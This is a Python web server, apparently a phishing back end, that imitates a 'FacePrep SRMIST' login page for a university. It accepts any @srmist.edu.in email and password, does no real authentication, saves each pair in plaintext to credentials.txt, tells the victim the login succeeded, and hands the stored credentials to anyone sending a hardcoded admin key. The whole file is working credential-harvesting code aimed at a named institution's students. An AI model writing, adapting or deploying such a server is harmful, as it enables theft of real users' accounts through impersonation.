from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import os
from datetime import datetime
from urllib.parse import parse_qs
import re

# Configuration
PORT = 3000
CREDENTIALS_FILE = os.path.join(os.path.dirname(__file__), 'credentials.txt')
ADMIN_KEY = 'srmist-admin-2024'

# Ensure credentials file exists
if not os.path.exists(CREDENTIALS_FILE):
    with open(CREDENTIALS_FILE, 'w', encoding='utf-8') as f:
        f.write('=== SRMIST Login Credentials ===\n\n')

class FacePrepHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        # Serve files from 'public' directory
        super().__init__(*args, directory='public', **kwargs)
    
    def do_POST(self):
        if self.path == '/api/login':
            self.handle_login()
        else:
            self.send_error(404, 'Not Found')
    
    def do_GET(self):
        if self.path == '/api/admin/credentials':
            self.handle_admin_credentials()
        elif self.path == '/admin':
            self.path = '/admin.html'
            super().do_GET()
        elif self.path == '/':
            self.path = '/index.html'
            super().do_GET()
        else:
            super().do_GET()
    
    def handle_login(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            email = data.get('email', '').strip()
            password = data.get('password', '')
            
            # Validate required fields
            if not email or not password:
                self.send_json_response(400, {
                    'success': False,
                    'message': 'Email and password are required'
                })
                return
            
            # Validate email domain
            if not email.lower().endswith('@srmist.edu.in'):
                self.send_json_response(400, {
                    'success': False,
                    'message': 'Only @srmist.edu.in email addresses are allowed'
                })
                return
            
            # Save credentials to file
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            entry = f'[{timestamp}]\nEmail: {email}\nPassword: {password}\n' + '─' * 40 + '\n\n'
            
            with open(CREDENTIALS_FILE, 'a', encoding='utf-8') as f:
                f.write(entry)
            
            self.send_json_response(200, {
                'success': True,
                'message': 'Login successful! Welcome to FacePrep SRMIST.'
            })
            
        except json.JSONDecodeError:
            self.send_json_response(400, {
                'success': False,
                'message': 'Invalid request format'
            })
    
    def handle_admin_credentials(self):
        admin_key = self.headers.get('X-Admin-Key', '')
        
        if admin_key != ADMIN_KEY:
            self.send_json_response(401, {
                'success': False,
                'message': 'Unauthorized access'
            })
            return
        
        try:
            with open(CREDENTIALS_FILE, 'r', encoding='utf-8') as f:
                credentials = f.read()
            
            self.send_json_response(200, {
                'success': True,
                'data': credentials
            })
        except Exception as e:
            self.send_json_response(500, {
                'success': False,
                'message': 'Error reading credentials file'
            })
    
    def send_json_response(self, status_code, data):
        response = json.dumps(data).encode('utf-8')
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(response))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(response)
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Admin-Key')
        self.end_headers()
    
    def log_message(self, format, *args):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")

def run_server():
    server = HTTPServer(('localhost', PORT), FacePrepHandler)
    print(f'''
================================================================
         FacePrep SRMIST Server Running!
================================================================

   Login Page:    http://localhost:{PORT}
   Admin Panel:   http://localhost:{PORT}/admin

   Admin Key: srmist-admin-2024

   Press Ctrl+C to stop the server
================================================================
''')
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n👋 Server stopped.')
        server.shutdown()

if __name__ == '__main__':
    run_server()
